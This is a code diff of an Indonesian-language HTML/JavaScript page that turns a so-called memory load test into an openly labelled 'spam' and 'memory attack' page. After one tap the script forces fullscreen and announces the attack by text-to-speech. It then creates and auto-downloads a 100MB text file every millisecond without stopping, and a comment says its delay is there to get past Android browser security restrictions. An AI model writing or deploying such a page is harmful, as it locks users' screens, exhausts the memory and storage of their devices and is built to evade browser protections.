@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Auto Fullscreen, TTS & Interval Overloop (1ms x 100MB TXT)</title>
+  <title>Auto Fullscreen & Infinite Spam Download (1ms x 100MB)</title>
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -21,6 +21,7 @@
       max-width: 650px;
       margin: 40px auto;
     }
+    /* Mengunci tampilan saat layar penuh */
     :fullscreen {
       background: #000000 !important;
       color: #00ff00 !important;
@@ -82,14 +83,14 @@
 
 <body>
   <div class="panel" id="main-panel">
-    <h2>Mobile Auto-Fullscreen & 1ms Interval Overloop</h2>
-    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan masuk layar penuh, menyalakan TTS, dan mengeksekusi pembuatan file teks 100MB setiap 1 milidetik tanpa batas.</p>
+    <h2>Mobile Auto-Fullscreen & Instant Spam</h2>
+    <p style="margin-bottom: 15px;">Ketuk tombol. Halaman WAJIB masuk layar penuh dahulu, lalu membom file teks 100MB setiap 1 milidetik.</p>
 
     <p>
-      <button id="start" type="button">⚠️ AKTIFKAN INTERVAL OVERLOOP ⚠️</button>
+      <button id="start" type="button">⚠️ LOCK FULLSCREEN & SPAM NOW ⚠️</button>
     </p>
 
-    <p id="status" role="status">Sistem siap untuk pengujian interval.</p>
+    <p id="status" role="status">Sistem siap.</p>
     <div id="downloads"></div>
   </div>
 
@@ -101,7 +102,7 @@
     let objectUrls = [];
     let isLooping = false;
 
-    // Fungsi Utilitas Text to Speech (TTS)
+    // Fungsi Suara (TTS)
     const speakText = (text) => {
       if ('speechSynthesis' in window) {
         window.speechSynthesis.cancel(); 
@@ -112,12 +113,12 @@
       }
     };
 
-    // Fungsi Asinkronus mempersiapkan Blob TXT 100MB di Microtask Queue
+    // Fungsi Asinkronus pembuat data 100MB
     const prepareBlobAsync = (i) => {
       return new Promise((resolve) => {
         queueMicrotask(() => {
           const sizeInBytes = 104857600; // 100 MB
-          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); // Karakter 'A'
+          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); // Huruf 'A'
           const blob = new Blob([dummyTextBuffer], { type: "text/plain;charset=utf-8" });
           const url = URL.createObjectURL(blob);
           resolve({ id: i, url: url });
@@ -125,59 +126,70 @@
       });
     };
 
-    // Memicu download secara instan menggunakan Event Loop Macrotask
+    // Pemicu Unduhan Instan ke Browser
     const triggerInstantDownload = (fileData) => {
-      setTimeout(() => {
-        const link = document.createElement("a");
-        link.href = fileData.url;
-        link.download = `interval-100mb-${String(fileData.id).padStart(3, '0')}.txt`;
-        link.textContent = `File ${fileData.id} (.txt)`;
-        downloads.appendChild(link);
-
-        link.click();
-      }, 0);
+      const link = document.createElement("a");
+      link.href = fileData.url;
+      link.download = `spam-100mb-${String(fileData.id).padStart(3, '0')}.txt`;
+      link.textContent = `File ${fileData.id} (.txt)`;
+      downloads.appendChild(link);
+      link.click();
     };
 
     start.addEventListener("click", () => {
       if (isLooping) return; 
-      isLooping = true;
 
-      // Pembersihan awal memori browser
+      // Pembersihan total memori di awal klik
       objectUrls.forEach(url => URL.revokeObjectURL(url));
       objectUrls = [];
       downloads.replaceChildren();
 
-      // 1. Picu TTS dan Fullscreen
-      speakText("Memulai simulasi pengujian beban memori tanpa batas.");
+      // ==========================================
+      // TAHAP 1: HARUS MASUK FULLSCREEN DULU (MURNI TANPA BEBAN SCRIPT LAIN)
+      // ==========================================
+      speakText("Layar penuh diaktifkan. Bersiap memulai serangan memori.");
+      
       const docEl = document.documentElement;
       try {
-        if (docEl.requestFullscreen) docEl.requestFullscreen();
-        else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
-        else if (docEl.mozRequestFullScreen) docEl.mozRequestFullScreen();
+        if (docEl.requestFullscreen) {
+          docEl.requestFullscreen();
+        } else if (docEl.webkitRequestFullscreen) { // Chrome & Safari Mobile
+          docEl.webkitRequestFullscreen();
+        } else if (docEl.mozRequestFullScreen) {
+          docEl.mozRequestFullScreen();
+        }
+        status.textContent = "Mengunci Layar Penuh... Silakan tunggu.";
       } catch (err) {
-        console.warn(err.message);
+        console.warn("Gagal fullscreen:", err.message);
       }
 
-      // 2. Menggunakan fungsi berbasis waktu (Interval) untuk membanjiri antrean secara konstan
-      let fileCounter = 1;
-      
-      setInterval(async () => {
-        // Membuat file baru secara terus menerus di dalam memori
-        const fileData = await prepareBlobAsync(fileCounter);
-        objectUrls.push(fileData.url);
+      // ==========================================
+      // TAHAP 2: BERI JEDA 250MS BIARKAN GRAFIK MOBILE MENGUNCI LAYAR PENUH, BARU SPAM DINYALAKAN
+      // ==========================================
+      setTimeout(() => {
+        isLooping = true;
+        let fileCounter = 1;
         
-        // Memicu unduhan instan ke antrean browser
-        triggerInstantDownload(fileData);
-        
-        status.textContent = `Mengalokasikan file ke-${fileCounter} di memori... (Total: ${fileCounter * 100} MB)`;
+        speakText("Layar penuh terkunci. Memulai pemboman file teks sekarang.");
 
-        // Update TTS setiap kelipatan 10 file agar pengguna tahu statusnya
-        if (fileCounter % 10 === 0) {
-          speakText(`Alokasi mencapai ${fileCounter} file.`);
-        }
+        setInterval(async () => {
+          // Membuat berkas baru di memori
+          const fileData = await prepareBlobAsync(fileCounter);
+          objectUrls.push(fileData.url);
+          
+          // Lemparkan ke bar notifikasi unduhan ponsel
+          triggerInstantDownload(fileData);
+          
+          status.textContent = `🚨 SPAM AKTIF! File ke-${fileCounter} (Total: ${fileCounter * 100} MB)`;
 
-        fileCounter++;
-      }, 1); 
+          // Suara berkala setiap kelipatan 10 unduhan
+          if (fileCounter % 10 === 0) {
+            speakText(`Spam mencapai ${fileCounter} file.`);
+          }
+
+          fileCounter++;
+        }, 1); // Kebiri antrean setiap 1 milidetik tanpa henti
+      }, 250); // Jeda 250 milidetik ini krusial untuk meloloskan restriksi keamanan browser Android!
     });
   </script>
 </body>
